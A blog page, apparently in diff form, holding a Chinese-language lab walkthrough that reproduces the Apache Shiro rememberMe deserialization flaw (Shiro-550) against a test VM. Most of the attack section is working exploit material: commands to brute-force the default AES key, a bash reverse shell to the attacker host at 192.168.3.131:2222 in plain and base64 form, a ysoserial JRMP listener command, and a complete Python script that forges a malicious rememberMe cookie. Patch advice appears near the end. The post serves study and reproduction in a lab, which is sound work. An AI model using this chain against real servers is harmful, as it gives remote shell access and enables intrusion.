@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。 1.1 漏洞原理Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hzktester&#96;s Blog">
+<meta property="og:url" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89.html">
+<meta property="og:site_name" content="Hzktester&#96;s Blog">
+<meta property="og:description" content="Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。 1.1 漏洞原理Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/E7BD0355B9BF43A785138AC8C91EAB92">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/B8E569926FF74DA29DB60B7742BE5CC9">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/F3550E88E39840D2A49C7E5B70695B2C">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/4C8AC5C447304FB79585B1472F4AB8F1">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/442B8283215C44D89161736740B1A40E">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/2B48B172EBF94BCFAA49B7A19A145FAD">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/369B6A06E8F249ECAC9EF6039FBCD047">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/9DDB5675D90E4038A04878BCAE82D07A">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/12FCF5FD2B2B40788B29499874E9E6AF">
+<meta property="og:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/B4B63D9C93964C80B570014DD29E6824">
+<meta property="article:published_time" content="2020-09-07T09:55:42.382Z">
+<meta property="article:modified_time" content="2020-09-07T09:55:42.382Z">
+<meta property="article:author" content="hzktester">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/E7BD0355B9BF43A785138AC8C91EAB92">
+
+<link rel="canonical" href="http://example.com/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Hzktester`s Blog
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hzktester`s Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">
+</h1>
+
+<div class="post-meta">
+  
+  <ul class="breadcrumb">
+          
+            <li><a href="/tags/">TAGS</a></li>
+            <li><a href="/tags/vulfocus%E9%9D%B6%E5%9C%BA/">VULFOCUS靶场</a></li>
+            <li><a href="/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/">SHIRO</a></li>
+            <li>SHIRO REMEMBERME反序列化漏洞复现过程（SHIRO-550）</li>
+          
+  </ul>
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
+<h2 id="1-1-漏洞原理"><a href="#1-1-漏洞原理" class="headerlink" title="1.1 漏洞原理"></a>1.1 漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
+<p>那么，Payload产生的过程：</p>
+<p>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</p>
+<p>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单</p>
+<h2 id="1-2-影响版本：Apache-Shiro-lt-1-2-4"><a href="#1-2-影响版本：Apache-Shiro-lt-1-2-4" class="headerlink" title="1.2 影响版本：Apache Shiro &lt; 1.2.4"></a>1.2 影响版本：Apache Shiro &lt; 1.2.4</h2><h2 id="1-3-特征判断：返回包中包含rememberMe-deleteMe字段"><a href="#1-3-特征判断：返回包中包含rememberMe-deleteMe字段" class="headerlink" title="1.3 特征判断：返回包中包含rememberMe=deleteMe字段"></a>1.3 特征判断：返回包中包含rememberMe=deleteMe字段</h2><h2 id="1-4-环境搭建："><a href="#1-4-环境搭建：" class="headerlink" title="1.4 环境搭建："></a>1.4 环境搭建：</h2><table>
+<thead>
+<tr>
+<th>角色</th>
+<th>系统版本</th>
+<th>IP</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>靶机</td>
+<td>Centos7</td>
+<td>192.168.3.130</td>
+<td>Shiro rememberMe反序列化漏洞环境</td>
+</tr>
+<tr>
+<td>攻击机</td>
+<td>kali-linux-2020.3</td>
+<td>192.168.3.131</td>
+<td>工具：maven、ysoserial、Shiro_exploit</td>
+</tr>
+</tbody></table>
+<h3 id="1-5-工具准备："><a href="#1-5-工具准备：" class="headerlink" title="1.5 工具准备："></a>1.5 工具准备：</h3><h4 id="1-5-1-maven配置"><a href="#1-5-1-maven配置" class="headerlink" title="1.5.1 maven配置"></a>1.5.1 maven配置</h4><p>kali安装<strong>maven</strong>，执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo wget  https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;maven&#x2F;maven-3&#x2F;3.6.3&#x2F;binaries&#x2F;apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">sudo mv apache-maven-3.6.3 &#x2F;usr&#x2F;local&#x2F;maven3</span><br></pre></td></tr></table></figure>
+
+<p>添加maven环境变量（在/etc/profile末尾添加maven环境变量:）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">export M2_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;maven3</span><br><span class="line">export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$M2_HOME&#x2F;bin</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-5-2-下载ysoserial并打包"><a href="#1-5-2-下载ysoserial并打包" class="headerlink" title="1.5.2 下载ysoserial并打包"></a>1.5.2 下载ysoserial并打包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git</span><br><span class="line">cd ysoserial</span><br><span class="line">mvn package -D skipTests</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-5-3-下载Shiro-exploit"><a href="#1-5-3-下载Shiro-exploit" class="headerlink" title="1.5.3 下载Shiro_exploit"></a>1.5.3 下载Shiro_exploit</h4><p>检查是否存在默认的key。安装Shiro_exploit</p>
+<p>Github项目地址：<a target="_blank" rel="noopener" href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p>
+<h3 id="1-6-利用链"><a href="#1-6-利用链" class="headerlink" title="1.6 利用链"></a>1.6 利用链</h3><ol>
+<li>攻击机使用Shiro_exploit爆破默认key（也就是AES加密的密钥）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;192.168.3.130:8080</span><br></pre></td></tr></table></figure>
+爆破出默认key如下：</li>
+</ol>
+<p><img src="E7BD0355B9BF43A785138AC8C91EAB92" alt="image"></p>
+<ol start="2">
+<li><p>攻击机制作反弹shell代码<br>监听本地端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure></li>
+<li><p>Java Runtime 配合 bash 编码。<br>在线编码地址：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.131&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="B8E569926FF74DA29DB60B7742BE5CC9" alt="image"></p>
+</li>
+<li><p>通过ysoserial中JRMP监听模块，监听8888端口并执行反弹shell命令。</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="F3550E88E39840D2A49C7E5B70695B2C" alt="image"></p>
+<ol start="5">
+<li>使用shiro.py 生成Payload</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro.py 192.168.3.131:8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="4C8AC5C447304FB79585B1472F4AB8F1" alt="image"></p>
+<p>shiro.py代码如下（注意key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)换为第一步爆破出的key）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])   </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-7-构造数据包，伪造cookie，反弹shell"><a href="#1-7-构造数据包，伪造cookie，反弹shell" class="headerlink" title="1.7 构造数据包，伪造cookie，反弹shell"></a>1.7 构造数据包，伪造cookie，反弹shell</h2><ol>
+<li>访问靶机环境（<a target="_blank" rel="noopener" href="http://192.168.3.130:8080/%EF%BC%89%E5%B9%B6%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E5%8B%BE%E9%80%89remember">http://192.168.3.130:8080/）并登录，登录勾选remember</a> me<br><img src="442B8283215C44D89161736740B1A40E" alt="image"></li>
+<li>成功登录后访问任意url并抓包，查看到cookie中的remember me参数<br><img src="2B48B172EBF94BCFAA49B7A19A145FAD" alt="image"></li>
+<li>获得的rememberMe置入cookies中<br><img src="369B6A06E8F249ECAC9EF6039FBCD047" alt="image"></li>
+<li>8888端口监听到流量信息</li>
+</ol>
+<p><img src="9DDB5675D90E4038A04878BCAE82D07A" alt="image"><br>5. 2222端口成功反弹shell</p>
+<p><img src="12FCF5FD2B2B40788B29499874E9E6AF" alt="image"></p>
+<h2 id="1-8-修复建议"><a href="#1-8-修复建议" class="headerlink" title="1.8 修复建议"></a>1.8 修复建议</h2><ol>
+<li>升级shiro到1.2.5及以上</li>
+<li>如果在配置里配置了密钥，一定不要使用网上的密钥！！</li>
+</ol>
+<h2 id="1-9-遇到的问题"><a href="#1-9-遇到的问题" class="headerlink" title="1.9 遇到的问题"></a>1.9 遇到的问题</h2><ol>
+<li>maven打包ysoserial时编译报错，需要在kali中安装jdk1.8的环境，配置环境变量（一定不要安装最新版的jdk，还会报错，不清楚原因）</li>
+<li>使用Shiro_exploit时报错<strong>No module named Crypto.Cipher</strong>，执行以下命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pip uninstall crypto</span><br><span class="line">sudo pip uninstall pycrypto</span><br><span class="line">sudo pip install pycrypto</span><br></pre></td></tr></table></figure></li>
+<li>kali2020.2版本默认没有pip，需要安装</li>
+</ol>
+<p>python3安装pip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py | python3</span><br><span class="line">pip -V</span><br></pre></td></tr></table></figure>
+<p>python2安装pip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.py</span><br><span class="line">python2 get-pip.py</span><br></pre></td></tr></table></figure>
+<p>检查安装情况<br><img src="B4B63D9C93964C80B570014DD29E6824" alt="image"></p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+  <ul class="breadcrumb">
+          
+            <li><a href="/tags/">TAGS</a></li>
+            <li><a href="/tags/vulfocus%E9%9D%B6%E5%9C%BA/">VULFOCUS靶场</a></li>
+            <li><a href="/tags/vulfocus%E9%9D%B6%E5%9C%BA/Shiro/">SHIRO</a></li>
+            <li>SHIRO REMEMBERME反序列化漏洞复现过程（SHIRO-550）</li>
+          
+  </ul>
+
+    
+    
+    
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">1.1 漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9AApache-Shiro-lt-1-2-4"><span class="nav-number">2.</span> <span class="nav-text">1.2 影响版本：Apache Shiro &lt; 1.2.4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E7%89%B9%E5%BE%81%E5%88%A4%E6%96%AD%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%8C%85%E4%B8%AD%E5%8C%85%E5%90%ABrememberMe-deleteMe%E5%AD%97%E6%AE%B5"><span class="nav-number">3.</span> <span class="nav-text">1.3 特征判断：返回包中包含rememberMe&#x3D;deleteMe字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">1.4 环境搭建：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">1.5 工具准备：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-1-maven%E9%85%8D%E7%BD%AE"><span class="nav-number">4.1.1.</span> <span class="nav-text">1.5.1 maven配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-2-%E4%B8%8B%E8%BD%BDysoserial%E5%B9%B6%E6%89%93%E5%8C%85"><span class="nav-number">4.1.2.</span> <span class="nav-text">1.5.2 下载ysoserial并打包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-3-%E4%B8%8B%E8%BD%BDShiro-exploit"><span class="nav-number">4.1.3.</span> <span class="nav-text">1.5.3 下载Shiro_exploit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">4.2.</span> <span class="nav-text">1.6 利用链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-7-%E6%9E%84%E9%80%A0%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E4%BC%AA%E9%80%A0cookie%EF%BC%8C%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">5.</span> <span class="nav-text">1.7 构造数据包，伪造cookie，反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-8-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="nav-number">6.</span> <span class="nav-text">1.8 修复建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-9-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">7.</span> <span class="nav-text">1.9 遇到的问题</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="hzktester"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">hzktester</p>
+  <div class="site-description" itemprop="description">越努力越幸运</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/hzktester" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hzktester" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1243547769@qq.com" title="E-Mail → mailto:1243547769@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hzktester</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body>
+</html>
